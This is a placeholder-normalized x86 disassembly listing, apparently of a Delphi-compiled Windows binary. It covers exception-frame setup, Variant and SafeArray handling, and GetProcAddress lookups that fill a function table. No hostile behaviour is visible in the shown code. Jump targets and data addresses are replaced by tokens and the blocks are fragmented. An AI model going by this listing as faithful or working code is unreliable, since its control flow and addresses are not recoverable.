mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d891
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40d89c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d8f6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40959c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8fd
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40d908
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d962
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40ae14
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d969
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40d974
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d9ce
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4095f4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d9d5
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40d9e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40da4d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4041d8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_40831c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da54
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_40da60
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dac0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409550
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_40477c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dac7
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40dad0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40db30
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a5a0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_40477c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db37
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40db40
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dba4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4083b8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_40477c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbab
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40dbd4
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40dc00
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d770
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7a0
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7a0
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7ac
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7ac
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7ac
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7ac
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7ac
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7ac
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7ac
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7ac
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7ac
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7b8
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7c4
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d830
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d89c
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d908
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d974
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9e0
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da60
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dad0
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db40
mov eax r-xdata
call sub_40dbd4
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40df0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40df31
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df38
retn
sub_40e58c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e5d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5dd
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40e5e0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e66f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413d5c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413d5c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e676
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f74
retn
sub_40e67c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e6c6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e6cd
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40e6d0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e71a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e721
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40e724
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e7b3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413d5c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413d5c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e7ba
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f74
retn
sub_40e7c0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e80a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e811
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40e814
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ea59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea60
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403f74
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
dec eax
je r-xdata
call sub_40e58c
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
jmp r-xdata
call sub_40e67c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40aea0
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
jmp r-xdata
sub_40ea74
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e5e0
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e724
jmp r-xdata
jmp r-xdata
call sub_40e814
sub_40eaa8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_40276c
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
call sub_40276c
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ea74
pop esi
pop ebx
retn
call sub_40276c
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ea74
jmp r-xdata
call sub_4027ac
mov edx eax
mov eax edx
call sub_403908
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40ea74
jmp r-xdata
pop esi
pop ebx
retn
sub_40eb2c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eb76
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb7d
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40eb94
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ebc4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ebc4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ec20
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ea68
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ea68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40eb94
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ea68
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ea68
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40ebc4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ea68
mov eax [ ebp - 0x314 ]
call sub_40ee18
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40ed9c
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ea68
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403f50
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_41432c
test al al
je r-xdata
mov eax ebx
call sub_40ec20
jmp r-xdata
push ebx
call VariantClear
call sub_40ea68
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40ee34
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ee64
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ee64
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40eec0
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ea68
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ea68
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40ee18
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e7c0
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ea68
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ea68
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ee34
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40ee64
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ea68
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ea68
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f094
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40ed9c
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ea68
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403fa4
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_41432c
test al al
je r-xdata
mov ecx sub_40f08c
mov edx esi
mov eax ebx
call sub_40eec0
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ea68
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f140
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f094
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40ed9c
sub_40f184
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f1e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f140
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f40c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f1e7
lea eax [ ebp - 0x10 ]
call sub_40ee18
retn
sub_40f1f0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f22e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412858
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413208
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f235
lea eax [ ebp - 0x4 ]
call sub_404630
retn
sub_40f23c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f27a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412130
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4131dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f281
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40f288
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f2c6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412efc
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41326c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f2cd
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
sub_40f2d4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f312
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412e30
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413240
xor eax eax
pop edx
pop ecx
